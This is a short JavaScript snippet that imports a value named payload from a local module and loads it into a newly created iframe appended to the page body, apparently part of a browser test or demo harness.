import { payload } from './source.js';

var iframe = document.createElement("iframe");
iframe.src = payload;
document.body.appendChild(iframe);
